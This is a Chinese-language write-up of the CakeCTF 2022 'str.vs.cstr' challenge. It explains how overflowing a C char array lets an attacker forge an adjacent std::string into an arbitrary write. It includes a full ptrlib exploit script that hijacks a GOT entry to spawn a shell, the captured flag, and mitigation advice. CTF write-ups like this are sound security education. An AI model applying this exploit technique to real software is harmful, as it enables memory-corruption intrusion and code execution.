# CakeCTF 2022 str.vs.cstr Writeup

## 题目简述

程序把一个固定大小的 C 字符数组和一个 `std::string` 连续放在同一对象中：

```cpp
class Test {
private:
  void call_me() {
    std::system("/bin/sh");
  }

  char _c_str[0x20];
  std::string _str;
};
```

菜单允许分别读写二者。`std::cin >> test.c_str()` 不知道 `_c_str` 只有 32 字节，可以覆盖紧随其后的 `std::string` 内部字段。目标二进制没有 PIE，且 GOT 在 partial RELRO 下可写；二进制还保留了直接调用 `system("/bin/sh")` 的私有函数 `call_me`。

## 解题过程

在题目使用的 libstdc++ ABI 中，长字符串状态可概括为三个关键字段：数据指针、长度、容量。向 `_c_str` 写入 32 字节填充后，再覆盖这三个字段：

```text
_str.data     = 目标地址
_str.length   = 8
_str.capacity = 8
```

这样，菜单中的“set str”会通过伪造后的数据指针写入 8 字节，形成一次受控任意地址写。

官方解法把目标设为 `_ZNSolsEPFRSoS_E@GOT`。该符号是 `std::ostream` 输出流操纵函数指针的重载，程序执行 `std::cout << std::endl` 时会调用它。随后把 `call_me` 的固定地址写入此 GOT 项：

```python
from ptrlib import ELF, Socket, p64

elf = ELF("chall")
sock = Socket("pwn1.2022.cakectf.com", 9003)

def set_cstr(data):
    sock.sendlineafter("choice: ", "1")
    sock.sendlineafter("c_str: ", data)

def set_str(data):
    sock.sendlineafter("choice: ", "3")
    sock.sendlineafter("str: ", data)

payload = b"A" * 0x20
payload += p64(elf.got("_ZNSolsEPFRSoS_E"))
payload += p64(8)
payload += p64(8)
set_cstr(payload)

call_me = elf.symbol("_ZN4Test7call_meEv")
set_str(p64(call_me))

# 让 choice 解析失败并进入带 std::endl 的退出输出。
sock.sendlineafter("choice: ", "x")
sock.sh()
```

`call_me` 虽然是非静态成员函数，但函数体不使用 `this`，因此从该调用点跳入仍能执行 `system("/bin/sh")`。获得 shell 后读取：

```text
CakeCTF{HW1: Remove "call_me" and solve it / HW2: Set PIE+RELRO and solve it}
```

## 方法总结

本题把 C 风格无界字符串输入与 C++ 对象布局放在一起。第一次溢出并不直接覆盖返回地址，而是伪造相邻 `std::string` 的内部状态；第二次正常的字符串赋值因此转化为任意地址写，最终劫持 GOT。

修复时应对字符数组使用有长度上限的输入接口，避免依赖标准库对象的内部布局，并启用 PIE 与 full RELRO。题目 flag 还指出，移除现成的 `call_me` 后需要自行构造代码执行目标；开启保护后则必须重新解决地址泄露与只读 GOT 问题。
